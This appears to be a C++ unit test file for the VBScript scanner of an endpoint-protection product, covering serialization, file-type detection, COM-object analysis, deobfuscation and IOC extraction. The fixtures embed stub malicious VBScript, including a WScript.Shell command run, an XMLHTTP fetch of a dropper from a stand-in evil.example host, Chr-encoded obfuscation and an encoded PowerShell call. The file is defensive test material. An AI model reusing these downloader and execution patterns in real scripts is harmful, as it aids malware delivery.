/*
 * ShadowStrike - Enterprise NGAV/EDR Platform
 * Copyright (C) 2026 ShadowStrike Security
 *
 * Unit coverage for deterministic VBScriptScanner behavior.
 *
 * Focus:
 *   - helper and flag contracts
 *   - DTO/config/statistics serialization
 *   - file-type and in-memory heuristic analysis
 *   - safe failure behavior around initialization state
 */

#include "pch.h"

#include <gtest/gtest.h>

#include <algorithm>
#include <filesystem>
#include <fstream>
#include <string>
#include <vector>

#include <Windows.h>
#include <nlohmann/json.hpp>

#include "../../../src/Shared_modules/Scripts/VBScriptScanner.hpp"

namespace ShadowStrike::Scripts::Test {
namespace {

using nlohmann::json;
namespace fs = std::filesystem;

class VBScriptScannerTest : public ::testing::Test {
protected:
    void SetUp() override {
        VBScriptScanner::Instance().Shutdown();
    }

    void TearDown() override {
        VBScriptScanner::Instance().Shutdown();
    }
};

bool ContainsString(const std::vector<std::string>& values, std::string_view needle) {
    return std::find(values.begin(), values.end(), needle) != values.end();
}

bool HasCapabilityFlag(VBSCapability value, VBSCapability bit) {
    return (static_cast<uint32_t>(value) & static_cast<uint32_t>(bit)) != 0;
}

const COMObjectUsage* FindObjectUsage(const std::vector<COMObjectUsage>& values,
                                      std::string_view objectName) {
    const auto it = std::find_if(values.begin(), values.end(),
        [objectName](const COMObjectUsage& usage) {
            return usage.objectName == objectName;
        });
    return (it != values.end()) ? &(*it) : nullptr;
}

fs::path WriteTempScript(std::wstring_view extension, std::string_view content) {
    const fs::path path =
        fs::temp_directory_path() /
        (L"shadowstrike_vbs_test_" +
         std::to_wstring(::GetCurrentProcessId()) + L"_" +
         std::to_wstring(::GetTickCount64()) +
         std::wstring(extension));

    std::ofstream output(path, std::ios::binary | std::ios::trunc);
    output.write(content.data(), static_cast<std::streamsize>(content.size()));
    output.close();
    return path;
}

}  // namespace

TEST_F(VBScriptScannerTest, HelperNamesFlagsAndSerializationRemainStable) {
    VBSCapability capabilities = VBSCapability::CommandExecution | VBSCapability::NetworkDownload;
    EXPECT_TRUE(HasCapability(capabilities, VBSCapability::CommandExecution));
    EXPECT_TRUE(HasCapability(capabilities, VBSCapability::NetworkDownload));
    EXPECT_FALSE(HasCapability(capabilities, VBSCapability::RegistryAccess));

    EXPECT_EQ(GetVBSFileTypeName(VBSFileType::HTA), "HTA");
    EXPECT_EQ(GetDangerousObjectTypeName(DangerousObjectType::WScriptShell), "WScript.Shell");
    EXPECT_EQ(GetVBSCapabilityName(VBSCapability::PowerShellInvoke), "PowerShellInvoke");
    EXPECT_EQ(GetVBSThreatCategoryName(VBSThreatCategory::Launcher), "Launcher");
    EXPECT_EQ(GetVBSObfuscationTypeName(VBSObfuscationType::VBEEncoding), "VBE Encoding");
    EXPECT_TRUE(IsSuspiciousVBSKeyword("ExecuteGlobal"));
    EXPECT_EQ(ClassifyCOMObject("WinHttp.WinHttpRequest.5.1"), DangerousObjectType::WinHttp);

    COMObjectUsage comUsage;
    comUsage.objectName = "WScript.Shell";
    comUsage.type = DangerousObjectType::WScriptShell;
    comUsage.methodsCalled = {"Run"};
    comUsage.lineNumber = 3;
    comUsage.isDangerous = true;
    comUsage.dangerReason = "Command execution capability";
    comUsage.capabilities = VBSCapability::CommandExecution;

    const json comJson = json::parse(comUsage.ToJson());
    EXPECT_EQ(comJson.at("objectName"), "WScript.Shell");
    EXPECT_TRUE(comJson.at("isDangerous").get<bool>());
    EXPECT_EQ(comJson.at("methodsCalled").size(), 1u);

    VBSDeobfuscationResult deobfuscation;
    deobfuscation.success = true;
    deobfuscation.obfuscationType = VBSObfuscationType::ChrEncoding;
    deobfuscation.depth = 2;
    deobfuscation.chrCallCount = 4;
    deobfuscation.originalScript = "Chr(87)";
    deobfuscation.deobfuscatedScript = "W";
    deobfuscation.extractedStrings = {"W"};
    deobfuscation.extractedUrls = {"https://evil.example"};
    deobfuscation.extractedIps = {"10.20.30.40"};

    const json deobfuscationJson = json::parse(deobfuscation.ToJson());
    EXPECT_TRUE(deobfuscationJson.at("success").get<bool>());
    EXPECT_EQ(deobfuscationJson.at("obfuscationType"),
              static_cast<int>(VBSObfuscationType::ChrEncoding));
    EXPECT_EQ(deobfuscationJson.at("originalLength"), deobfuscation.originalScript.size());

    VBSScanResult result;
    result.status = VBSScanStatus::Suspicious;
    result.riskScore = 85;
    result.category = VBSThreatCategory::Downloader;
    result.capabilities = VBSCapability::NetworkDownload;
    result.detectedCapabilities = {"NetworkDownload"};
    result.isObfuscated = true;
    result.obfuscationType = VBSObfuscationType::ChrEncoding;
    result.extractedIOCs = {"url:https://evil.example/dropper.exe"};
    result.dangerousObjects = {comUsage};

    EXPECT_TRUE(result.ShouldBlock());

    const json resultJson = json::parse(result.ToJson());
    EXPECT_EQ(resultJson.at("riskScore"), 85);
    EXPECT_TRUE(resultJson.at("isObfuscated").get<bool>());
    EXPECT_EQ(resultJson.at("dangerousObjects").size(), 1u);
}

TEST_F(VBScriptScannerTest, ConfigurationValidationAndFileTypeDetectionEnforceGuardrails) {
    VBSScannerConfiguration config;
    EXPECT_TRUE(config.IsValid());

    config.maxFileSize = 0;
    EXPECT_FALSE(config.IsValid());

    config = {};
    config.maxDeobfuscationDepth = 101;
    EXPECT_FALSE(config.IsValid());

    auto extensionPath = WriteTempScript(L".vbs", "Dim x\nx = 1\n");
    auto headerPath = WriteTempScript(L".txt", "<job><script language=\"VBScript\"></script></job>");
    auto encodedPath = WriteTempScript(L".txt", "#@~^aaaaaa==bbbb==cccccc^#~@");

    auto& scanner = VBScriptScanner::Instance();
    EXPECT_EQ(scanner.DetectFileType(fs::temp_directory_path() / L"shadowstrike_missing_script.vbs"),
              VBSFileType::Unknown);
    EXPECT_EQ(scanner.DetectFileType(extensionPath), VBSFileType::VBS);
    EXPECT_EQ(scanner.DetectFileType(headerPath), VBSFileType::WSF);
    EXPECT_EQ(scanner.DetectFileType(encodedPath), VBSFileType::VBE);

    fs::remove(extensionPath);
    fs::remove(headerPath);
    fs::remove(encodedPath);
}

TEST_F(VBScriptScannerTest, AnalysisHelpersIdentifyDangerousObjectsCapabilitiesAndIocs) {
    auto& scanner = VBScriptScanner::Instance();
    ASSERT_TRUE(scanner.Initialize());

    const std::string script =
        "Set sh = CreateObject(\"WScript.Shell\")\n"
        "sh.Run \"cmd.exe /c calc.exe\"\n"
        "Set xhr = CreateObject(\"MSXML2.XMLHTTP\")\n"
        "xhr.Open \"GET\", \"https://evil.example/dropper.exe\", False\n"
        "xhr.Send\n"
        "Set wmi = GetObject(\"winmgmts:\")\n";

    const auto comObjects = scanner.AnalyzeCOMUsage(script);
    ASSERT_GE(comObjects.size(), 3u);
    const COMObjectUsage* shellUsage = FindObjectUsage(comObjects, "WScript.Shell");
    ASSERT_NE(shellUsage, nullptr);
    EXPECT_EQ(shellUsage->type, DangerousObjectType::WScriptShell);
    EXPECT_TRUE(shellUsage->isDangerous);
    EXPECT_TRUE(ContainsString(shellUsage->methodsCalled, "Run"));

    const COMObjectUsage* xmlHttpUsage = FindObjectUsage(comObjects, "MSXML2.XMLHTTP");
    ASSERT_NE(xmlHttpUsage, nullptr);
    EXPECT_TRUE(ContainsString(xmlHttpUsage->methodsCalled, "Open"));
    EXPECT_TRUE(ContainsString(xmlHttpUsage->methodsCalled, "Send"));
    EXPECT_FALSE(ContainsString(xmlHttpUsage->methodsCalled, "Run"));

    const COMObjectUsage* wmiUsage = FindObjectUsage(comObjects, "winmgmts:");
    ASSERT_NE(wmiUsage, nullptr);
    EXPECT_FALSE(ContainsString(wmiUsage->methodsCalled, "Send"));

    const auto capabilities = scanner.DetectCapabilities(script + "powershell -enc AAAA\n");
    EXPECT_TRUE(HasCapabilityFlag(capabilities, VBSCapability::CommandExecution));
    EXPECT_TRUE(HasCapabilityFlag(capabilities, VBSCapability::NetworkDownload));
    EXPECT_TRUE(HasCapabilityFlag(capabilities, VBSCapability::WMIAccess));
    EXPECT_TRUE(HasCapabilityFlag(capabilities, VBSCapability::PowerShellInvoke));

    EXPECT_EQ(scanner.DetectObfuscation(
                  "Execute Chr(65)&Chr(66)&Chr(67)&Chr(68)&Chr(69)&Chr(70)&Chr(71)&Chr(72)&Chr(73)&Chr(74)"),
              VBSObfuscationType::ChrEncoding);

    const auto deobfuscation = scanner.Deobfuscate(
        "\"http\" & \"://evil.example\" & \"/payload.vbs\"");
    EXPECT_TRUE(deobfuscation.success);
    EXPECT_TRUE(ContainsString(deobfuscation.extractedStrings, "http://evil.example/payload.vbs"));

    const auto iocs = scanner.ExtractIOCs(
        "url = \"https://evil.example/dropper.exe\"\n"
        "url2 = \"https://evil.example/other.exe\"\n"
        "ip = \"10.20.30.40\"\n"
        "path = \"C:\\temp\\payload.exe\"\n");
    EXPECT_TRUE(ContainsString(iocs, "url:https://evil.example/dropper.exe"));
    EXPECT_TRUE(ContainsString(iocs, "ip:10.20.30.40"));
    EXPECT_TRUE(ContainsString(iocs, "domain:evil.example"));
    EXPECT_TRUE(ContainsString(iocs, "path:C:\\temp\\payload.exe"));
    EXPECT_EQ(std::count(iocs.begin(), iocs.end(), "domain:evil.example"), 1);

    EXPECT_TRUE(scanner.IsDangerousCOMObject("ADODB.Stream"));
    EXPECT_FALSE(scanner.IsDangerousCOMObject("Safe.Custom.Object"));
}

TEST_F(VBScriptScannerTest, UninitializedScanFailsSafelyAndStatisticsCanReset) {
    auto& scanner = VBScriptScanner::Instance();

    const auto preInitResult = scanner.ScanSource("WScript.Echo \"hi\"", "sample.vbs");
    EXPECT_EQ(preInitResult.status, VBSScanStatus::ErrorParsing);

    ASSERT_TRUE(scanner.Initialize());
    (void)scanner.ScanSource("WScript.Echo \"hi\"", "sample.vbs");

    const auto statsAfterScan = scanner.GetStatistics();
    EXPECT_GE(statsAfterScan.totalScans, 1u);

    scanner.ResetStatistics();
    const auto resetStats = scanner.GetStatistics();
    EXPECT_EQ(resetStats.totalScans, 0u);
    EXPECT_EQ(resetStats.dangerousObjectsFound, 0u);
}

}  // namespace ShadowStrike::Scripts::Test
